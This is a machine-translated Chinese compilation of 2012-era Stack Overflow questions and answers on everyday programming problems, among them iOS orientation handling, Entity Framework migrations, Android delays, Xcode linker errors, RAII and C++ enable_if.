我希望有人可能对此有经验，因为 discountasp 网站非常缺乏直截了当的答案。

我正在构建一个轻量级的 Web 应用程序，并决定将 sql ce 作为它的数据库。关于这个的两个问题：

1.  我是否需要托管一个实际的数据库以及该站点才能使其正常工作？

2.  您知道 discountasp 是否支持使用 sql ce（不使用 webmatrix 或任何 cms 构建，完全自定义）？如果他们不这样做，您对完成这项工作有任何经验/建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T17:21:02.340

我在 discountAsp.net 上做了主机，并使用 sql ce 作为轻量级数据库。在这种情况下，您只需要托管网站，不需要数据库托管。我使用 SQL ce 3.5，它工作正常。但是当我升级网站以使用带有 EF 的 ms sql ce 4.0 时遇到问题。我正在寻找他们对 sql ce 的支持版本。所以找到你的帖子。

# objective-c - 在 iOS 中使用单独的视图控制器支持两个方向

> ID：12624910
> 
> 赞同：1
> 
> 时间：2012-09-27T15:28:48.420
> 
> 标签：objective-c, ios, cocoa-touch, ipad, uikit

我现在真是一团糟。我使用了执行此操作的苹果示例代码：

1.  创建纵向视图控制器和横向视图控制器
2.  Potrait 事件控制器然后注册设备方向更改通知
3.  当设备旋转时，它会为横向视图呈现一个模式视图控制器，或者如果它旋转回纵向则关闭横向视图。
    除了一个小问题之外，一切都正常工作....

现在到我的问题。我用它从表格视图中启动了一个可旋转的视图控制器。它可以旋转并且工作正常。但如果我最初以横向模式启动它，它仍会以纵向模式启动。如果我想要风景，我必须在之后再次将其旋转到风景。我非常努力地解决这个问题但失败了。[您可以从Apple Developer Site Here](http://developer.apple.com/library/ios/#samplecode/AlternateViews/Listings/PortraitViewController_m.html#//apple_ref/doc/uid/DTS40008755-PortraitViewController_m-DontLinkElementID_8)下载并运行示例代码。任何人都可以修复此代码，以便如果在横向模式下启动它会呈现横向视图的模式视图？否则我将不得不重写所有内容以使用单个视图控制器。这些是苹果代码的相关部分：

```
- (void)viewDidLoad
{
self.view.backgroundColor = [UIColor colorWithRed:197.0/255.0 green:204.0/255.0 blue:211.0/255.0 alpha:1.0];

LandscapeViewController *viewController = [[LandscapeViewController alloc]
                                                initWithNibName:@"LandscapeView" bundle:nil];
self.landscapeViewController = viewController;
[viewController release];

[[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(orientationChanged:)
                                                name:UIDeviceOrientationDidChangeNotification object:nil]; 
```

}

```
- (void)orientationChanged:(NSNotification *)notification
{
// We must add a delay here, otherwise we'll swap in the new view
// too quickly and we'll get an animation glitch
[self performSelector:@selector(updateLandscapeView) withObject:nil afterDelay:0];
}

- (void)updateLandscapeView
{
UIDeviceOrientation deviceOrientation = [UIDevice currentDevice].orientation;
if (UIDeviceOrientationIsLandscape(deviceOrientation) && !isShowingLandscapeView)
{
    [self presentModalViewController:self.landscapeViewController animated:YES];
    isShowingLandscapeView = YES;
}
else if (deviceOrientation == UIDeviceOrientationPortrait && isShowingLandscapeView)
{
    [self dismissModalViewControllerAnimated:YES];
    isShowingLandscapeView = NO;
}    
}

// override to allow orientations other than the default portrait orientation
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{return (interfaceOrientation == UIInterfaceOrientationPortrait); // support only portrait} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-03T15:48:55.957

我知道这可能与您不再相关，但我刚刚遇到了同样的故障，这是我的解决方案。

从您设置代码的方式（包括 Apple 的设置方式）

```
- (void)updateLandscapeView 
```

仅在发送通知以告知 ViewController 方向更改时才调用：这里的问题是，这是负责检查其自身方向的方法。（即启动应用程序时不会调用此方法，因此它不会检查设备是否处于任何其他方向）

解决方案非常简单：在启动时强制调用方法，即在 viewDidLoad 中。. .

```
[self  updateLandscapeView] 
```

这将强制调用该方法并检查接口方向，第一次之后，该方法将在收到更改方向的通知时再次调用

希望这可以帮助外面的人

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T01:02:01.983

除非您仅在设置中指定横向，否则设备似乎采用纵向。您唯一的选择是在您的纵向视图中使用 loadview 方法来检测方向并在启动期间交换视图。

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
        {
           if(interfaceOrientation == UIInterfaceOrientationPortrait || interfaceOrientation == UIInterfaceOrientationPortraitUpsideDown ) {
        //Load vertical interface
           }
    else
    {
    //load landscape
    }
        } 
```

# objective-c - Objective-C：带有协议的实例指针

> ID：12624916
> 
> 赞同：2
> 
> 时间：2012-09-27T15:28:58.587
> 
> 标签：objective-c, cocoa, pointers, protocols, cocoa-design-patterns

通常，当开发人员创建一个指向实现协议的类的实例时，她会这样做：

```
id<ProtocolName> myInstance = [[SomeClass alloc] init]; 
```

可以更具体地了解实例的类类型并像这样使用它吗？

```
SomeClass<ProtocolName> *myInstance = [[SomeClass alloc] init]; 
```

或在方法中：

```
- (SomeClass<ProtocolName> *)someMethodWithArg:(int)arg; 
```

通过实现（假设 SomeSuperClass 是 SomeClass 的超类）：

```
- (SomeClass<ProtocolName> *)someMethodWithArg:(int)arg
{
   SomeClass<ProtocolName> *instance = [[SomeSuperClass alloc] init];

   return instance;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:35:34.817

是的，没关系。（虽然我认为你的最后一个例子使用`SomeClass`了应该使用的地方`SomeSuperClass`，但我明白你的意思。）

事实上，有时您需要这样做。例如，要在 an 上使用`autorelease`or （这`release`对 an`NSObject`不可用`id<ProtocolName>`（除非`ProtocolName`明确符合`NSObject`协议）），您必须使用：

```
NSObject<ProtocolName> *protoObj = [....];
[....]
[protoObj autorelease]; 
```

# entity-framework - 无法从主应用程序执行自定义 NuGet 包的代码优先迁移

> ID：12624917
> 
> 赞同：6
> 
> 时间：2012-09-27T15:29:01.333
> 
> 标签：entity-framework, code-first, entity-framework-migrations

我创建了一个要包含在主 MVC3 Web 应用程序中的模块。该模块被打包成一个 NuGet 包，可以通过 NuGet 安装和卸载。主站点和模块都使用 Code First，EF >= 4.3

要创建包，我有另一个 MVC3 站点，所有功能都在一个区域内，所以要创建包，我只需打包库、视图和所有需要的文件。数据库迁移在项目中运行良好，并且包创建得很好。

现在我通过 NuGet 在主站点安装包。该站点在另一个解决方案中，该解决方案有两个项目：

*   MyProject.Web.UI：这是一个 Mvc3 项目
*   MyProject.EntityFramework：这是一个包含所有模型的类库，MyProject 的 dbContext...

包已正确安装，并且区域、区域视图和库已正确安装。

现在的问题是我如何更新数据库？我首先尝试运行“Update-Database”，但收到以下消息：

> “在程序集 'MyProject.Web.UI' 中找不到迁移配置类型。（在 Visual Studio 中，您可以使用包管理器控制台中的 Enable-Migrations 命令添加迁移配置）。”

然后我尝试使用“Enable-Migrations”启用迁移，但我收到了另一条消息：

> “在程序集 'MyProject.Web.UI' 中找不到上下文类型。”

我还尝试运行该站点并查看是否自动应用更改，但我得到带有典型消息的异常页面：

> “支持 'NugetPackageDbContext' 上下文的模型在创建数据库后发生了变化。考虑使用 Code First 迁移来更新数据库”

我不知道如何使用 NuGet 包中的迁移所需的更改来更新数据库。任何人都可以在这件事上有所启发吗？我对迁移很陌生，如果有更改而不是在控制台中运行命令，也许有一些配置可以更新数据库，我有点迷茫。

提前致谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T13:28:14.710

好消息！看来我明白了。我正在寻找一种方法来制作 NuGet 包以将数据库更新到最新版本。

好吧，这个包带有一个管理控制器，所以我添加了一个名为更新的新操作：

```
public ActionResult Update()
    {
        System.Data.Entity.Database.SetInitializer(new System.Data.Entity.MigrateDatabaseToLatestVersion<MyPackageDbContext, MyPackage.Migrations.Configuration>());
        return View();
    } 
```

在我的迁移配置类中，我有：

```
public Configuration()
    {
        AutomaticMigrationsEnabled = true;
    } 
```

我不得不说，在我做这一切的过程中，我发现了一些奇怪的行为。令我惊讶的一件事是，我不知道这是否正常，请阅读以下内容：

1.  安装了新迁移的软件包，但数据库不是最新的。因此，如果我访问受此影响的 EF，我会得到关于此的异常。到此为止。
2.  我去我的行动 /MyPackage/Admin/Update 并运行它。显然它运行。我去数据库，我没有看到变化。甚至迁移表也没有新行。
3.  我再次访问之前显示异常的 EF 部分（第 1 点），然后一切正常，数据库更新，迁移表显示新行。

您必须注意的一件事是 Configuration 类是内部的，但是因为这是一个模块，所以我需要从另一个程序集中访问它。我试图将其公开，但我收到了一些奇怪的警告/错误，我不知道它们是否相关。所以最后我把它保留在内部但使用了

```
[assembly: System.Runtime.CompilerServices.InternalsVisibleTo("OtherAssembly")] 
```

我在 Visual Studio 中发现了一些奇怪的行为，包括 NuGet 包、CF、迁移等所有这些东西……我不知道这些东西是否是错误，但所有这些东西花了我整整两个工作日。

我希望它对任何其他想要创建可更新的 CF NuGet 包的人有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T16:11:24.207

在包管理器控制台中，您将需要默认项目`MyProject.EntityFramework`

您可能还需要确保`MyProject.Web.UI`设置为启动项目（如果有多个），然后您可以将连接字符串传递给更新命令：

```
Update-Database -ConnectionStringName MyConnStringName 
```

这应该会正确更新数据库，除非有数据会丢失。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T16:03:23.210

如果您`DbContext`在其中，`MyProject.EntityFramework`则需要将包管理器控制台中的默认项目设置为，`MyProject.EntityFramework`然后才能使用`Update-Database`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-13T13:57:04.330

我意识到这个问题已经很老了，但是由于我没有看到这个答案，所以无论如何我都会把它扔掉。

要对项目或外部引用执行迁移等，您仍然可以使用相同的三个命令：

```
Enable-Migrations
Add-Migration
Update-Database 
```

但您需要提供一些额外的参数。对于 Enable-Migrations 命令，您需要添加 -ContextTypeName 和可选的 -ContextAssemblyName 命令，如下所示：

```
Enable-Migrations -ContextTypeName MyProject.EntityFramework.NugetPackageDbContext -ContextAssemblyName MyProject 
```

这将为您提供当前项目中的迁移配置类。其他两个命令将要求您指定此配置类：

```
Update-Database -ConfigurationTypeName MyProject.Web.UI.Migrations.Configuration 
```

希望有帮助

# eclipse - Eclipse - 以编程方式打开编辑器会导致焦点问题

> ID：12624920
> 
> 赞同：4
> 
> 时间：2012-09-27T15:29:07.123
> 
> 标签：eclipse, focus, editor, awt, albireo

我正在使用的 Eclipse 插件有点问题。在这个插件中，通常以编程方式打开一种特殊类型的插件专用编辑器；这是由各种视图/编辑器中的各种操作触发的，但打开编辑器的代码是相同的。特定于插件的编辑器可以正常打开；但是，我最近注意到每次打开这些编辑器中的一个时，都会发生奇怪的焦点故障：

打开编辑器时，它似乎获得焦点，但如果在此之后立即单击先前活动的视图/编辑器，它不会收回焦点。只要单击先前活动的视图/编辑器以外的任何内容，问题就会立即解决，并且焦点会正常恢复。

例如，假设您从 Package Explorer 视图中选择了一个上下文菜单选项，这会导致打开一个编辑器。编辑器正确打开并且似乎有焦点。在此之后，您首先再次单击 Package Explorer，但它没有获得焦点（编辑器似乎仍然有焦点）。您右键单击 Package Explorer，但不会出现 Package Explorer 特定的上下文菜单项。在此之后，单击其他视图，然后再次单击 Package Explorer。现在包资源管理器像往常一样获得焦点。

这是我用来打开编辑器的代码：

```
IWorkbenchPage page = PlatformUI.getWorkbench().getActiveWorkbenchWindow().getActivePage();
final GraphEditorPart gp = (GraphEditorPart) page.openEditor(new NullEditorInput(), "editor.id"); 
```

在此之后，编辑器通过 albireo SWT-AWT 桥填充了一些视觉效果（不确定这是否与问题相关——用于主编辑器元素的类是 org.eclipse.albireo.core.SwingControl）。

我认为问题可能是编辑器没有“真正”获得焦点，或者之前的活动视图没有“真正”失去焦点，所以我尝试添加以下行：

```
page.activate(gp); 
```

然而，这似乎并没有改变任何东西。为什么会发生这种情况？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2017-01-13T09:17:55.127

> 包名：rcp_demo.Editor
> 
> 类名：EmpCommand.java、EmployeeEditor.java 和 EmployeeEditorInput.java

* * *

```
package rcp_demo.Editor;

import org.eclipse.core.commands.AbstractHandler;
import org.eclipse.core.commands.ExecutionEvent;
import org.eclipse.core.commands.ExecutionException;
import org.eclipse.ui.IEditorReference;
import org.eclipse.ui.IWorkbenchPage;
import org.eclipse.ui.IWorkbenchWindow;
import org.eclipse.ui.PartInitException;
import org.eclipse.ui.handlers.HandlerUtil;

public class EmpCommand extends AbstractHandler {
    public static final String Id = "rcp_demo.Editor.EmpCommand";

    @Override
    public Object execute(ExecutionEvent event) throws ExecutionException {

         IWorkbenchWindow window = HandlerUtil.getActiveWorkbenchWindow(event);
            IWorkbenchPage page = window.getActivePage();
            IEditorReference[] editors = page.getEditorReferences();
            EmployeeEditorInput input = new EmployeeEditorInput();

            //All Comments are easily understand
            //public class EmployeeEditorInput implements IEditorInput{}

            for (int i=0; i<editors.length; i++) {

            //List out all Exist editor
            //compare with EmployeeEditor.Id="rcp_demo.Editor.emp";

              if (editors[i].getId().equals(EmployeeEditor.Id)) {

                //public class EmployeeEditor extends EditorPart
                //{
                //  public static final String Id="rcp_demo.Editor.emp";
                //      public void createPartControl(Composite parent) {.....}
                //}

                    page.activate(editors[i].getEditor(true));
                    System.out.println("set focus an existing editor(Employee)");
                    return null;
              } 
            }
            try {
                //open new Editor like EmployeeEditor.Id="rcp_demo.Editor.emp";
                page.openEditor(input,EmployeeEditor.Id);
                System.out.println("open Editor(Employee) ");
            } catch (PartInitException e) {
                e.printStackTrace();
            }
        return null;
    }
} 
```

* * *

完整描述此问答访问： [Eclipse RCP：在编辑器窗口中打开相同的编辑器](https://stackoverflow.com/questions/41606181/eclipse-rcp-have-the-same-editor-open-in-editor-window)

# facebook - 无效提交 在设置您的应用详细信息页面之前...指定您的应用如何与 Facebook 集成

> ID：12624921
> 
> 赞同：1
> 
> 时间：2012-09-27T15:29:10.893
> 
> 标签：facebook

当我尝试“提交应用程序详细信息页面”时，我收到此消息

提交无效 在设置您的应用详细信息页面之前，您必须指定您的应用如何与 Facebook 集成。单击此处查看您的应用程序设置页面以管理您的集成。

但如果我点击页面上的链接 For : 选择您的应用如何与 Facebook 集成

> 带有 Facebook 登录的网站**已选中并呈绿色。**

有人也有这个问题吗？

# java - 在 Java 中使用原始数据创建图像

> ID：12624938
> 
> 赞同：0
> 
> 时间：2012-09-27T15:30:21.293
> 
> 标签：java, tcp, javax.imageio

我编写了一个小型 TCP 客户端来检索各种数据。它适用于文本，但我不知道如何实现图像处理。目前，传入的数据存储在`ArrayList<String>`：

```
public ArrayList<String> sendSelector(String selector, String host, int port) throws IOException {
    socket = new Socket(host, port);
    out = new PrintWriter(socket.getOutputStream(), true);
    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

    out.println(encodePercent(selector) + CRLF);

    ArrayList<String> lines = new ArrayList();
    String line;

    while ((line = in.readLine()) != null) {
        if (line.equals("."))
            break;

        lines.add(line);
    }

    out.close();
    in.close();
    socket.close();

    return lines;
} 
```

如何创建`Image`或`BufferedImage`从 GIF 或 JPEG 中存储`ArrayList<String>`？（或者我完全一无所知，必须使用不同的数据结构？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:38:43.737

从服务器打开输入流后，使用以下命令创建图像[`ImageIO.read(InputStream)`](http://docs.oracle.com/javase/6/docs/api/javax/imageio/ImageIO.html#read%28java.io.InputStream%29)：

```
public BufferedImage sendSelector(String selector, String host, int port) throws IOException {
    socket = new Socket(host, port);
    try {
        out = new PrintWriter(socket.getOutputStream(), true);
        out.println(encodePercent(selector) + CRLF);
        in = socket.getInputStream();
        return ImageIO.read(in);
    } finally {
        socket.close(); // closes in and out as well
    }
} 
```

为了提高效率，您可以`in`将`BufferedInputStream`.

# android - 如何在android中的多个任务中延迟

> ID：12624941
> 
> 赞同：1
> 
> 时间：2012-09-27T15:30:25.433
> 
> 标签：android

我想在动态更改不同按钮的背景图像时引入 5 秒延迟，您可以在下面查看我的代码。我测试了用于延迟的数字内置方法，即 SLEEP()、WAIT() 等，但是它让我的应用程序进入睡眠状态。

请有人帮助我开发“myDelayMethod(mSeconds);”

我会非常感谢你。

```
int mSeconds =5;//Seconds 

for(number=1; number<5;number++)
{
    if(number==1)
    {
    buttonLED1.setBackgroundResource(R.drawable.buttonyellow);
    myDelayMethod(mSeconds);
    buttonLED1.setBackgroundResource(R.drawable.buttonblue);
    myDelayMethod(mSeconds);
    }

    else if(number==2)
    {
    buttonLED2.setBackgroundResource(R.drawable.buttonyellow);
    myDelayMethod(mSeconds);
    buttonLED2.setBackgroundResource(R.drawable.buttonblue);
    myDelayMethod(mSeconds);
    }

    else if(number==3)
    {
    buttonLED3.setBackgroundResource(R.drawable.buttonyellow);
    myDelayMethod(mSeconds);
    buttonLED3.setBackgroundResource(R.drawable.buttonblue);
    myDelayMethod(mSeconds);
    }

    else if(number==4)
    {
    buttonLED4.setBackgroundResource(R.drawable.buttonyellow);
    myDelayMethod(mSeconds);
    buttonLED4.setBackgroundResource(R.drawable.buttonblue);
    myDelayMethod(mSeconds);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:59:28.547

```
Button[] buttons = {buttonLED1, buttonLED2, buttonLED3, buttonLED4};

for (Button button : buttons) {

    button.postDelayed(new Runnable() {

        @Override
        public void run() {
            button.setBackgroundResource(R.drawable.buttonblue);
        }
    }, 1000 * mSeconds);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:33:52.087

您可能想要寻找`Handler.postDelayed()`.

# xcode - 更新到 xcode 4.5，现在应用程序构建失败“Apple Mach-O 链接器错误”

> ID：12624944
> 
> 赞同：0
> 
> 时间：2012-09-27T15:30:46.543
> 
> 标签：xcode, build, linker, mach-o

嗨，我是应用程序开发的新手，但在升级到 xcode 4.5 之前，我确实有一个应用程序运行良好。该应用程序没有改变，但是当我尝试将同一个应用程序放在我一直使用的同一台 iPad 上时，我现在得到“构建失败”。

我收到的错误显示在这里[http://i1342.photobucket.com/albums/o763/designbyria/ScreenShot2012-09-27at162319_zpsfea02141.png](http://i1342.photobucket.com/albums/o763/designedbyria/ScreenShot2012-09-27at162319_zpsfea02141.png)（我愚蠢地无法包含图像） - Apple Mach-O Linker Error，确实有谁知道我该如何解决这个问题？我真的不知道发生了什么，重要的是我让这个应用程序尽快运行！

任何和所有的帮助将不胜感激！提前谢谢你……</p>

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:38:37.903

如果您的应用仅适用于 iPad，只需从有效架构中删除 armv7s。您也可以对 iPhone 应用程序执行此操作，它将在所有可行的目标上运行，尽管它会缺少 armv7s，这是 iPhone 5 的 CPU - armv7 代码仍将运行。

或者，您可以找到支持 armv7s 构建的 Cordova 框架的升级版本；你应该能够自己构建它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:37:30.637

错误在上面的行。您正在链接的框架 (Cordova.framework) 不包含适用于适当处理器架构 (armv7s) 的二进制文件。

# c++ - 可以将延迟加载视为 RAII 的示例吗？

> ID：12624946
> 
> 赞同：3
> 
> 时间：2012-09-27T15:30:48.870
> 
> 标签：c++, objective-c, lazy-loading, raii, meta

在 iOS 上独家使用 Objective-C 几年后，我最近一直在追赶我的 c++，而“新风格”c++ 上出现最多的话题是 RAII

为了确保我正确理解 RAII 概念，您是否将 Objective-C 延迟加载属性访问器视为一种 RAII？例如，检查以下访问方法

```
- (NSArray *)items {
    if(_items==nil) {
        _items=[[NSArray alloc] initWithCapacity:10];
    }
    return _items
} 
```

这会被视为 RAII 的一个例子吗？如果没有，你能解释一下我错在哪里吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T15:45:52.707

**不幸的是， RAII**被广泛滥用。

*Resources Acquisition Is Initialization*最初的概念就是使用构造函数来保证事情的发生。在这个想法中：

```
std::fstream out("somefile.txt", "w"); 
```

应该保证如果`out`曾经创建过，那么该文件存在并且可以使用。

因此，*延迟加载与 RAII 正好相反*！

注意：不过，如今，RAII 主要用于指代*自动清理*。一个例子是智能指针。这离最初的目标有点远。

* * *

关于清理，另一个成语是 SBRM for *Scoped Bound Resources Management*。但是，它并没有完全捕捉到确定性清理的概念。SBRM 的想法是保证当某个对象超出范围时将清理资源。这可以通过`boost::scoped_ptr`例如来实现。

但是，这无法捕获 a 的`unique_ptr`作用，因为您实际上可以`return`a`unique_ptr`让资源逃脱它创建的范围！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T15:36:11.290

虽然首字母缩略词命名为初始化，但成语的重点是破坏。*Resource Acquisition Is Initialization*更多的是关于*Scoped Bound Resource Management*，即让对象管理资源并在超出范围时将其清除。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-27T15:35:48.037

一点都不。此外，通过“新型 C++”，您的意思是“至少在过去 15 年里，每个理智的人都在专门做这件事”。

RAII 涉及自动存储持续时间的对象，在它们的析构函数中清理动态对象，这些对象是它们拥有的。所有权的确切时间无关紧要。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:32:18.760

不; RAII 是一些具有动态存储的对象被包装在具有自动存储的对象中，并在具有自动存储的对象被销毁时被销毁。

延迟加载（仅在您真正需要时才加载对象，而不是之前加载）和 RAII 并没有真正的关系。

# java - 如何在eclipse中安装onvif库

> ID：12624947
> 
> 赞同：1
> 
> 时间：2012-09-27T15:30:51.443
> 
> 标签：java, eclipse, import, onvif

我只是在使用 ONVIF。[我已经从http://synesis.ru/en/surveillance/downloads](http://synesis.ru/en/surveillance/downloads)下载了“onvifdm-onvif.tar.gz”下载了“onvifdm-onvif.tar.gz” ，其中有四个文件（onvif.discovery.dll、onvif.services.dll、onvif.session。 dll 和 onvif.utils.dll）。我还从这个论坛获得了一个演示代码，其中有这样的行“import org.onvif.ver10.schema.SystemDateTime;”

显然，演示代码找不到 onvif 库，因为错误消息说“无法解析导入 org.onvif”。

谁能让我知道如何找到合适的 onvif 库，如何将其正确导入到我的 Eclipse 中？任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:31:52.517

或者 Netbeans -> 新项目 -> java 项目 -> 完成。右键单击项目 -> 新建 -> jaxb 绑定并导入 onvif.xsd -> 完成它会生成很多文件等。

eclipse -> your_project -> src -> 右键单击​​ -> 导入 -> 通用 -> 文件夹 -> 并搜索您的 netbeans 文件夹/build/generated-sources/jaxb。

导入整个 jaxb 文件夹，然后就可以了！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T13:40:22.697

最好的办法是从 wsdl 文件开始并生成您的类。Visual Studio 支持它，或者您可以使用 gsoap。

# ruby-on-rails - Rails form_for html 设置为显示：无

> ID：12624950
> 
> 赞同：1
> 
> 时间：2012-09-27T15:31:16.473
> 
> 标签：ruby-on-rails, ruby, forms

我有一个用于创建和编辑新酒店的标准 rails form_for 标签。当通过 edit_hotels_path 访问时，这呈现得很好，但是当访问 new_hotels_path 时，html 表单标签被设置为`display: none;`导致表单仅在“新”视图中不显示。

我已经重新启动服务器，清空缓存，确保它们使用相同的 CSS，但它仍然呈现显示设置为无。以下是使用开发人员工具看到的样式

```
<form accept-charset="UTF-8" action="/hotels" class="new_hotel" id="new_hotel" method="post" style="display: none; "><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="✓"><input name="authenticity_token" type="hidden" value="pDlR3gV2tm+Z7xRFdC0uclNY13FlzxUSOjOrHs2ttO0="></div>

element.style {
display: none;
} 
```

下面是正在呈现的 html 源代码，其中不包括 display: none;

```
 <form accept-charset="UTF-8" action="/hotels" class="new_hotel" id="new_hotel" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="pDlR3gV2tm+Z7xRFdC0uclNY13FlzxUSOjOrHs2ttO0=" /></div>

  <div class="control-group">
    <div class="controls">
    <input id="hotel_name" name="hotel[name]" placeholder="Name..." size="30" type="text" /><br>
        <select id="hotel_year" name="hotel[year]"><option value="2012">2012</option>
<option value="2013">2013</option>
<option value="2014">2014</option>
<option value="2015">2015</option></select><br>
        <select id="hotel_month" name="hotel[month]"><option value="January">January</option>
<option value="February">February</option>
<option value="March">March</option>
<option value="April">April</option>
<option value="May">May</option>
<option value="June">June</option>
<option value="July">July</option>
<option value="August">August</option>
<option value="September">September</option>
<option value="October">October</option>
<option value="November">November</option>
<option value="December">December</option></select><br>

    <textarea cols="40" id="hotel_body" name="hotel[body]" placeholder="Hotel info up to 1000 words..." rows="20">
</textarea><br>
    <input id="hotel_meta_tags" name="hotel[meta_tags]" placeholder="Enter meta tags for image, as a comma separated list..." size="30" type="text" /><br>
<legend>Winner</legend>
        <input name="hotel[winner]" type="hidden" value="0" /><input id="hotel_winner" name="hotel[winner]" type="checkbox" value="1" />
        <br/>

    </div>
<div class="form-actions">
    <input class="btn-large btn-success" name="commit" type="submit" value="create" />
  </div>
</div>
</form> 
```

以下是代码，不胜感激。

_form.html.erb

```
<%= form_for @hotel do |f| %>
<% if @hotel.errors.any? %>
  <div id="error_explanation">
    <h2><%= pluralize(@hotel.errors.count, "error") %> prohibited this article from being saved:</h2>

    <ul>
    <% @hotel.errors.full_messages.each do |msg| %>
      <li><%= msg %></li>
    <% end %>
    </ul>
  </div>
<% end %>

    <%= render partial: "shared/code_sheet" %>
  <div class="control-group">
    <div class="controls">
    <%= f.text_field :name, placeholder: "Name..." %><br>
        <%= f.select :year, [2012, 2013, 2014, 2015] %><br>
        <%= f.select :month, ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"] %><br>

    <%= f.text_area :body, placeholder: "Hotel info up to 1000 words..." %><br>
    <%= f.text_field :meta_tags, placeholder: "Enter meta tags for image, as a comma separated list..." %><br>
<legend>Winner</legend>
        <%= f.check_box :winner %>
        <br/>

    </div>
<div class="form-actions">
    <%= f.submit "create", class: "btn-large btn-success" %>
  </div>
</div>
<% end %> 
```

编辑.html.erb

```
<div class="container">
<h1>Editing hotel</h1>

<%= render "form" %>
<%= link_to 'hotels index', hotels_path %>
</div> 
```

新的.html.erb

```
<div class="container">
<h1>New hotel</h1>

<%= render "form" %>
<%= link_to 'hotels index', hotels_path %>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T16:28:51.717

它可以是任何东西。你必须知道你的 CSS 中有什么。您是否搜索过“显示：无；” 在您的 CSS 文件中并检查匹配项？element.style 通常直接设置在 HTML 标签上。搜索视图并放置调试字符串以确保它正在拉取适当的 .html。

# c++ - c++11 enable_if 错误

> ID：12624957
> 
> 赞同：9
> 
> 时间：2012-09-27T15:31:36.600
> 
> 标签：c++, c++11

我看到了以下 C++11 的 enable_if 示例：

```
struct is_64_bit
{
    static const bool value = sizeof(void*) == 8;
};

enable_if<is_64_bit::value, void>::type
my_memcpy(void* target, const void* source, size_t n)
{
    cout << "64 bit memcpy" << endl;
}

enable_if<!is_64_bit::value, void>::type
my_memcpy(void* target, const void* source, size_t n)
{
    cout << "32 bit memcpy" << endl;
} 
```

据我了解，根据系统架构，“my_memcpy”功能可用于 32 位或 64 位版本。但我在编译时收到以下错误：

```
error: ‘type’ in ‘struct std::enable_if<false, void>’ does not name a type 
```

我有点困惑，因为我认为应该只有 32 版本可用（我使用的是 Linux Fedora 32 位）。

也许这个例子有问题？还是我错过了什么？

谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-27T16:24:17.507

[`std::enable_if`](http://en.cppreference.com/w/cpp/types/enable_if)通过[替换失败不是错误](http://en.wikipedia.org/wiki/Substitution_failure_is_not_an_error)(SFINAE) 的原则来工作，它指出当在实例化函数模板时发生某些类型的错误时，程序会继续使用该函数模板进行编译，而不参与重载决议。

要让 SFINAE 发挥作用，(a) 它必须在函数（或方法）模板上使用，并且 (b) 它必须依赖于模板参数。你的程序在这两个方面都失败了。

要使`enable_if`依赖模板参数，最简单的方法是添加一个默认参数：

```
template<typename T = void> typename enable_if<is_64_bit::value, T>::type
my_memcpy(void* target, const void* source, size_t n) 
```

但是，这通常不是一个明智的使用`enable_if`; 因为它依赖于拦截编译错误，所以它往往很昂贵。在您的情况下，模板专业化将是一个更好的主意：

```
#include <iostream>

template<int = sizeof(void *)> void my_memcpy(void* target, const void* source, size_t n);

template<> void my_memcpy<8>(void* target, const void* source, size_t n) {
    std::cout << "64 bit memcpy" << std::endl;
}

template<> void my_memcpy<4>(void* target, const void* source, size_t n) {
    std::cout << "32 bit memcpy" << std::endl;
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-27T15:53:22.490

该模板`template< bool B, class T = void > struct enable_if`是专门的，因此它仅`typedef type`在条件 B 为时才具有 a `true`。

你的编译器是正确的。`type`in没有 typedef `struct std::enable_if<false, void>`。中只有一个 typedef `struct std::enable_if<true, void>`。

更多信息请看[这里](http://en.cppreference.com/w/cpp/types/enable_if)。

因此，要解决您的问题，您需要确保`enable_if`which 具有评估为`false`永远不会被编译的 B 。[您可以在SFINAE](http://en.wikipedia.org/wiki/Substitution_failure_is_not_an_error)的帮助下通过制作`my_memcpy`函数模板来实现这一点。编译器在编译 B 求值为 的函数模板失败时不会报告错误，`false`并将成功编译和使用 B 求值为 的函数`true`。

```
#include <iostream>
#include <type_traits>

using namespace std;

struct is_64_bit
{
   static const bool value = sizeof(void*) == 8;
};

template<typename T>
typename enable_if<is_64_bit::value, T>::type
my_memcpy(T* target, const T* source, size_t n)
{
  cout << "64 bit memcpy" << endl;
}

template<typename T>
typename enable_if<!is_64_bit::value, T>::type
my_memcpy(T* target, const T* source, size_t n)
{
  cout << "32 bit memcpy" << endl;
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-27T16:26:41.847

